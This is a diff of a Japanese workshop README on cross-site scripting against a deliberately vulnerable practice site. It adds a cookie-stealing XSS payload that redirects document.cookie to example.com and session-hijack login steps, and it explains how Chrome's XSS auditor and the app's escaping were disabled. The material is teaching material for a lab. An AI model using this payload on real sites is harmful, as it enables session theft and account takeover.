@@ -20,7 +20,7 @@ XSS (_クロス_ サイト スクリプティング) の性質上，localhostの
 ## 脆弱サイトをいじってみる
 
 ```bash
-$ browser http://当日教える.com
+$ google-chrome http://当日教える.com
 ```
 
 1. `/` において， `user: sampleuser`, `pass: samplepass` と入力してログイン
@@ -33,10 +33,10 @@ _攻撃目的: `sampleuser/samplepass` を知らないのに，`sampleuser`と�
 ### 攻撃者サイトを準備
 
 ```bash
-$ cd 20131117-tokumaru-benkyokai/sample-sites/ex00_WhatIsXSS
+$ cd 20131117-tokumaru-benkyokai/sample-sites/attacker-sites/ex00_WhatIsXSS
 $ carton install  # 大体5分以上かかります・・・・
 $ carton exec perl -Ilib script/ex00_whatisxss-server
-$ browser http://localhost:5000
+$ google-chrome http://localhost:5000
 ```
 
 ### 怪しいリンクを踏ませて脆弱サイトのCookieを入手
@@ -47,7 +47,7 @@ $ browser http://localhost:5000
 1. 攻撃者サイトにリダイレクトされ，攻撃者サイトに脆弱サイトのCookieが表示される(表示されるということは，その文字列を攻撃者サーバに保存することも容易)
 
 ```bash
-$ google-chrome --disable-xss-auditor "http://localhost:5000/status?uid=%3Cscript%3Ealert(%22hoge%22)%3C/script%3E"
+$ google-chrome --disable-xss-auditor "http://当日教える.com/status?uid=%3Cscript%3Ewindow.location=%22http://example.com/?cookie=%22%2bdocument.cookie%3C/script%3E"
 ```
 
 _注意: まともなブラウザなら，単純なXSS攻撃は検知してscript実行を中止する．`--disable-xss-auditor`によってchromeにわざとXSS攻撃に引っかかってもらう．_
@@ -58,5 +58,30 @@ _注意: まともなブラウザなら，単純なXSS攻撃は検知してscrip
 1. 下記のように脆弱サイトにアクセスし，ログインが成立
 
 ```bash
-$ browser http://当日教える.com/login?sid=[セッションID]
+$ google-chrome http://当日教える.com/login?sid=[セッションID]
 ```
+
+
+## 付録
+
+### 攻撃者サイトの準備
+
+```bash
+$ cd 20131117-tokumaru-benkyokai/sample-sites/vulnerable-sites/ex00_WhatIsXSS
+$ sqlite3 db/development.db < sql/sqlite.sql
+$ carton install
+$ carton exec perl -Ilib script/ex00_whatisxss-server --host=[IPアドレス] --port=[ポート番号]
+```
+
+### Amon2とGoogle Chromeを脆弱にするためにわざわざやったこと
+
+最近のブラウザやらWebアプリフレームワークやらは脆弱性対策されてるんですね．
+おい! 誰だPHPの話したの!! 関係ないだろ!!!!
+
+<dl>
+  <dt>ChromeのXSS検知&防止機構を無効にする</dt>
+  <dd>起動オプションに --disable-xss-auditor をつけて，サーバからのレスポンスヘッダには<a href="/sample-sites/vulnerble-sites/ex00_WhatIsXSS/lib/Web.pm#L47">X-XSS-Protectionを0に指定</a></dd>
+
+  <dt>XslateのHTMLエスケープを無効化</dt>
+  <dd><a href="/sample-sites/vulnerable-sites/ex00_WhatIsXSS/tmpl/status.tx#L10">mark_raw 指定をする</a></dd>
+</dl>
